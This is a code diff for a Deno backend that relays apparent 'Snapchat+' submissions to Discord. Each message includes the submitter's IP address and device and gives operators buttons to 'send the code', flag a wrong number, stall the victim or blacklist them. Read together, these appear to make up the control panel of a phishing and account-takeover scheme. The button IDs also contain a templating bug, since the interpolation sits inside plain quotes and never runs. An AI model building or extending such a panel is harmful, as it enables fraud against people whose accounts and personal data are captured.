@@ -44,12 +44,6 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
-  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
-  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
-
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -63,20 +57,35 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      {
-        name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
-        inline: false
-      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  await fetch(DISCORD_WEBHOOK, {
+  const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
+  const DISCORD_CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
+
+  await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+    headers: {
+      "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: "@everyone",
+      embeds: [embed],
+      components: [
+        {
+          type: 1,
+          components: [
+            { type: 2, style: 3, label: "✅ Envoyer le code", custom_id: "valid_${submissionId}" },
+            { type: 2, style: 4, label: "❌ Mauvais numéro", custom_id: "wrong_${submissionId}" },
+            { type: 2, style: 1, label: "⏳ Faire patienter", custom_id: "wait_${submissionId}" },
+            { type: 2, style: 4, label: "🚫 Blacklist instant", custom_id: "blacklist_${submissionId}" }
+          ]
+        }
+      ]
+    })
   });
 
   await base44.asServiceRole.entities.ActionLog.create({
